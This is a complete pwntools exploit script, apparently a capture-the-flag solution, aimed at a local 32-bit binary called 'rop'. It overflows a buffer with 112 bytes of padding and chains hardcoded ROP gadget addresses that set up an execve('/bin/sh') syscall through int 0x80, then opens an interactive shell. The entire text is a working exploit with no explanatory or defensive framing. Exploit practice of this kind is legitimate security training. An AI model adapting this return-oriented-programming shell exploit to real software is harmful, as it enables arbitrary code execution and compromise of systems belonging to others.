from pwn import *

p = process('./rop')

eax = 0x080bb196
ebx_ecx = 0x0806eb91
edx = 0x0806eb6a
binsh = 0x080be408
int_80 = 0x08049421

playload = 'A'*112 + p32(eax) + p32(0xb) + p32(ebx_ecx)
playload += p32(0x0) + p32(binsh) + p32(edx) + p32(0x0) + p32(int_80)

p.sendline(playload)
p.interactive()
